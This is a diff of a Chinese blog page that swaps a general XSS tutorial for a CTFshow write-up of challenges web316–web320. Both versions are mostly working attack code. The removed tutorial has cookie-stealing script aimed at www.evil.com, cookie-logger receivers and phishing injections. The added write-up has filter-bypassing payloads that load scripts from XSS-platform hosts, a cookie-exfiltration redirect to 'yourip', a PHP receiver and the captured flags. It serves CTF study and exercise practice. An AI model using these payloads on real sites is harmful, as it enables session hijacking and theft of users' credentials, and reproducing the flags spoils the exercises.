@@ -22,23 +22,26 @@
     var CONFIG = {"hostname":"zhoufish.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="简介跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。">
+  <meta name="description" content="前言有关XSS跨站脚本的学习 CTFshou web316 - web333 如有不足请指教。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="跨站脚本攻击XSS">
-<meta property="og:url" content="http://zhoufish.com/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/index.html">
+<meta property="og:title" content="CTFshowXSS">
+<meta property="og:url" content="http://zhoufish.com/2022/CTFshowXSS/index.html">
 <meta property="og:site_name" content="卷心菜">
-<meta property="og:description" content="简介跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。">
+<meta property="og:description" content="前言有关XSS跨站脚本的学习 CTFshou web316 - web333 如有不足请指教。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhoufish.com/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233332570.png">
-<meta property="og:image" content="http://zhoufish.com/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233924916.png">
-<meta property="article:published_time" content="2022-03-16T15:02:50.000Z">
-<meta property="article:modified_time" content="2022-03-24T07:20:10.882Z">
+<meta property="og:image" content="http://zhoufish.com/2022/CTFshowXSS/image-20220324171406960.png">
+<meta property="og:image" content="http://zhoufish.com/2022/CTFshowXSS/image-20220324173002178.png">
+<meta property="og:image" content="http://zhoufish.com/2022/CTFshowXSS/image-20220324172852305.png">
+<meta property="og:image" content="http://zhoufish.com/2022/CTFshowXSS/image-20220324195535250.png">
+<meta property="article:published_time" content="2022-03-24T09:10:29.000Z">
+<meta property="article:modified_time" content="2022-03-25T11:15:25.722Z">
 <meta property="article:author" content="欣喜">
 <meta property="article:tag" content="web">
+<meta property="article:tag" content="练习">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhoufish.com/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233332570.png">
+<meta name="twitter:image" content="http://zhoufish.com/2022/CTFshowXSS/image-20220324171406960.png">
 
-<link rel="canonical" href="http://zhoufish.com/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/">
+<link rel="canonical" href="http://zhoufish.com/2022/CTFshowXSS/">
 
 
 <script id="page-configurations">
@@ -51,7 +54,7 @@
   };
 </script>
 
-  <title>跨站脚本攻击XSS | 卷心菜</title>
+  <title>CTFshowXSS | 卷心菜</title>
   
 
 
@@ -198,7 +201,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zhoufish.com/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/">
+    <link itemprop="mainEntityOfPage" href="http://zhoufish.com/2022/CTFshowXSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -211,7 +214,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          跨站脚本攻击XSS
+          CTFshowXSS
         </h1>
 
         <div class="post-meta">
@@ -221,7 +224,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2022-03-16 23:02:50" itemprop="dateCreated datePublished" datetime="2022-03-16T23:02:50+08:00">2022-03-16</time>
+              <time title="创建时间：2022-03-24 17:10:29" itemprop="dateCreated datePublished" datetime="2022-03-24T17:10:29+08:00">2022-03-24</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -229,7 +232,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                  <a href="/categories/Web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web渗透</span></a>
                 </span>
             </span>
 
@@ -246,7 +249,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.4k</span>
+              <span>2.3k</span>
             </span>
 
         </div>
@@ -258,85 +261,63 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有关XSS跨站脚本的学习</p>
+<p>CTFshou web316 - web333</p>
+<p>如有不足请指教。</p>
 <span id="more"></span>
 
-<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
-<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
-<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233332570.png"></p>
-<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
-<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233924916.png"></p>
-<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
-<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
-<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
-<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
-<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h1 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h1><p><img src="/2022/CTFshowXSS/image-20220324171406960.png" alt="image-20220324171406960"></p>
+<p>需要我们生成XSS链接，获取Cookies值</p>
+<p>我们查看cookies值发现</p>
+<p><img src="/2022/CTFshowXSS/image-20220324173002178.png"></p>
+<p>提示我们不是管理员，我们要获取管理员的cookies</p>
+<p><strong>XSS平台</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://xsscom.com/">http://xsscom.com</a></li>
+</ul>
+<p>创建项目，然后用给出的xss代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&#x27;&quot;&gt;&lt;script src=http:/</span><span class="regexp">/xsscom.com/</span><span class="regexp">/DFaNg9&gt;&lt;/</span>script&gt;</span><br><span class="line">或</span><br><span class="line">&lt;<span class="regexp">/textarea&gt;&#x27;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/</span><span class="keyword">var</span>%20b%3Ddocument.<span class="property">createElement</span>%<span class="number">28</span>%22script%<span class="number">22</span>%<span class="number">29</span>%3Bb.<span class="property">src</span>%3D%22http%3A%2F%2Fxsscom.<span class="property">com</span>%2F%2FDFaNg9%<span class="number">22</span>%3B%28<span class="variable language_">document</span>.<span class="property">getElementsByTagName</span>%<span class="number">28</span>%22HEAD%<span class="number">22</span>%<span class="number">29</span>%5B0%5D%7C%7Cdocument.<span class="property">body</span>%<span class="number">29.</span>appendChild%28b%<span class="number">29</span>%3B/.<span class="property">source</span>));<span class="comment">//&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/CTFshowXSS/image-20220324172852305.png"></p>
+<p>返回就可以得到flag。</p>
+<p>ctfshow{3ac271b1-349e-4d2c-a865-460c813407a0}</p>
+<h1 id="Web317"><a href="#Web317" class="headerlink" title="Web317"></a>Web317</h1><p>开始有过滤了</p>
+<p>使用最常规的语句，发现没有回显，应该把script过滤了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&lt;/script&gt; </span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试下面代码，发现img标签没有被过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(0)&gt;</span><br></pre></td></tr></table></figure>
 
-<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
-<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
-<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
-<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
-<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
-<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
-<ul>
-<li><strong>重定向钓鱼</strong></li>
-</ul>
-<p>将当前访问重定向到一个钓鱼网页</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我利用平台的img构造恶意代码，不用死磕一个平台</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/tEXtArEa&gt;&#x27;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/</span><span class="keyword">var</span>%20b%3Ddocument.<span class="property">createElement</span>%<span class="number">28</span>%22script%<span class="number">22</span>%<span class="number">29</span>%3Bb.<span class="property">src</span>%3D%22https%3A%2F%2Fxss.<span class="property">pt</span>%2FGvJw%<span class="number">22</span>%3B%28<span class="variable language_">document</span>.<span class="property">getElementsByTagName</span>%<span class="number">28</span>%22HEAD%<span class="number">22</span>%<span class="number">29</span>%5B0%5D%7C%7Cdocument.<span class="property">body</span>%<span class="number">29.</span>appendChild%28b%<span class="number">29</span>%3B/.<span class="property">source</span>));<span class="comment">//&gt;</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><strong>HTML注入式钓鱼</strong></li>
-</ul>
-<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/CTFshowXSS/image-20220324195535250.png" alt="image-20220324195535250"></p>
+<p> flag&#x3D;ctfshow{429bbec6-2afc-4aec-89b4-67f46ea8b9f2}</p>
+<h1 id="Web318"><a href="#Web318" class="headerlink" title="Web318"></a>Web318</h1><p>把上面的img标签，发现已经被过滤</p>
+<p>但是body标签可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(0)&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><strong>iframe钓鱼</strong></li>
-</ul>
-<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>我还是用<a target="_blank" rel="noopener" href="https://xss.pt/">xss平台</a>上的 payload，不用要xss的域名，被过滤了</p>
+<p>payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe <span class="variable constant_">WIDTH</span>=<span class="number">0</span> <span class="variable constant_">HEIGHT</span>=<span class="number">0</span> srcdoc=。。。。。。。。。。&amp;#x3C;&amp;#x73;&amp;#x43;&amp;#x52;&amp;#x69;&amp;#x50;&amp;#x74;&amp;#x20;&amp;#x73;&amp;#x52;&amp;#x43;&amp;#x3D;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x30;&amp;#x78;&amp;#x2E;&amp;#x61;&amp;#x78;&amp;#x2F;&amp;#x54;&amp;#x78;&amp;#x48;&amp;#x4E;&amp;#x22;&amp;#x3E;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x43;&amp;#x72;&amp;#x49;&amp;#x70;&amp;#x54;&amp;#x3E;&gt;</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><strong>Flash钓鱼</strong></li>
-</ul>
-<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
-<ul>
-<li><p>高级钓鱼技术</p>
-<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
-</li>
-</ul>
-<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
-<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
-<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
-<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
-<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
-<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
-<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
-<li><strong>HTML实体编码</strong></li>
-</ul>
-<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
-<p>字符编码</p>
-<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
-<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
-<ul>
-<li><strong>URL编码</strong></li>
-</ul>
-<p>两次URL全编码</p>
-<ul>
-<li><strong><code>String.fromCharCode</code>编码</strong></li>
-</ul>
-<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
-<p>XSS绕过也可以看看该文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
-<hr>
-<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
+<p>flag&#x3D;ctfshow{e99af536-da38-4361-abb4-9f3932453e20}</p>
+<h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure>
+
+<p> flag&#x3D;ctfshow{a8354559-bba7-47ab-b82b-4e341e2cb6ef}</p>
+<h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>上面的打不通，增加了什么过滤，fuzz测试一下</p>
+<p>空格被过滤了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用<span class="comment">/**/</span>、tap、/ 代替空格</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body<span class="comment">/**/</span>onload=<span class="string">&quot;window.location.href=&#x27;http://yourip/cookies.php?1=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这里遇到在线网站没有办法弄了，就只能自己弄了个服务器，一下就出来了</p>
+<p>用的网上的php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;tmp/flag.txt&#x27;</span>,<span class="variable">$content</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no data input&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag&#x3D;ctfshow{f34aa339-5c2b-4cd4-b2e9-51060517d3f2}</p>
 
     </div>
 
@@ -352,7 +333,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://zhoufish.com/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/" title="跨站脚本攻击XSS">http://zhoufish.com/2022/跨站脚本攻击XSS/</a>
+    <a href="http://zhoufish.com/2022/CTFshowXSS/" title="CTFshowXSS">http://zhoufish.com/2022/CTFshowXSS/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -383,6 +364,7 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/web/" rel="tag"><i class="fa fa-tags"></i> web</a>
+              <a href="/tags/%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tags"></i> 练习</a>
           </div>
 
         
@@ -391,13 +373,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/" rel="prev" title="Misc小合集（一）">
-      <i class="fa fa-chevron-left"></i> Misc小合集（一）
+    <a href="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/" rel="prev" title="每日Misc一">
+      <i class="fa fa-chevron-left"></i> 每日Misc一
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/" rel="next" title="每日Misc一">
-      每日Misc一 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -470,7 +449,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E5%88%86%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">XSS分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%88%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">存储型 XSS（持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%88%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">反射型 XSS（非持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-DOM-%E7%9A%84-XSS"><span class="nav-number">2.3.</span> <span class="nav-text">基于 DOM 的 XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">XSS利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookies%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">Cookies利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="nav-number">3.2.</span> <span class="nav-text">会话劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%93%E9%B1%BC"><span class="nav-number">3.3.</span> <span class="nav-text">钓鱼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%A1%B5%E4%B8%8A%E9%A9%AC"><span class="nav-number">3.4.</span> <span class="nav-text">网页上马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOS%E4%B8%8EDDOS"><span class="nav-number">3.5.</span> <span class="nav-text">DOS与DDOS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-%E8%A0%95%E8%99%AB"><span class="nav-number">3.6.</span> <span class="nav-text">XSS 蠕虫</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E7%BB%95%E8%BF%87WAF"><span class="nav-number">4.</span> <span class="nav-text">XSS绕过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">4.1.</span> <span class="nav-text">编码绕过</span></a></li></ol></li></ol></div>
